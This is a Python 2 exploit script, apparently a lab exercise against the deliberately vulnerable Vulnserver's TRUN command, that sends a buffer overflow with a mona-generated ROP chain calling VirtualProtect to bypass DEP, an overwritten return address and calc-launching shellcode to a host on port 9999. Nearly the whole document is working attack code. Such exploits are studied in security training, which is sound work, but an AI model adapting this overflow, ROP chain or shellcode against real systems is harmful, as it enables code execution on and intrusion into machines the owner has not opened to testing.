#!/usr/bin/python
# tested on windows 7 x86 sp1
import socket
import struct
import sys

# !mona rop -m *.dll -cp nonull

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x77918e0d,  # POP EDI # RETN [msvcrt.dll] 
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x77832bdf,  # MOV ESI,DWORD PTR DS:[EDI] # RETN [MSCTF.dll] 
      0x77df1ef4,  # POP EBP # RETN [ntdll.dll] 
      0x77fa2273,  # & jmp esp [NSI.dll]
      0x77993930,  # POP EAX # RETN [msvcrt.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x77f01483,  # NEG EAX # RETN [RPCRT4.dll] 
      0x7796d3a5,  # XCHG EAX,EBX # RETN [msvcrt.dll] 
      0x77777a4e,  # POP EAX # RETN [kernel32.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76393193,  # NEG EAX # RETN [user32.dll] 
      0x7794ad98,  # XCHG EAX,EDX # RETN [msvcrt.dll] 
      0x77926ee9,  # POP ECX # RETN [msvcrt.dll] 
      0x62504a8f,  # &Writable location [essfunc.dll]
      0x77f53026,  # POP EDI # RETN [RPCRT4.dll] 
      0x77f01485,  # RETN (ROP NOP) [RPCRT4.dll]
      0x7793f5d4,  # POP EAX # RETN [msvcrt.dll] 
      0x90909090,  # nop
      0x77965cfc,  # PUSHAD # RETN [msvcrt.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

junk = 'A' * 2006 # junk 

eip = struct.pack("<L",0x625011AF) 

nops = '\x90' * 16 # nops

brk = '\xcc' # break point

padding = 'F' * (3000 - 2006 - len(rop_chain) - 16 - 1) # padding shellcode



# pop calc.exe

shellcode =  "\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
shellcode += "\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
shellcode += "\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
shellcode += "\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
shellcode += "\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
shellcode += "\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"
shellcode += "\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC"

payload = junk + rop_chain + nops + shellcode

try:
    print "\nSending tons of random bytes..."
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(('192.168.0.14',9999))
    s.recv(1024)
    s.send(('TRUN .' + payload + '\r\n'))
    s.recv(1024)
    s.send('EXIT\r\n')
    s.close()
    print "\nDone! Wonder if we got that shell back?"
except:
    print "Could not connect to 9999 for some reason..."


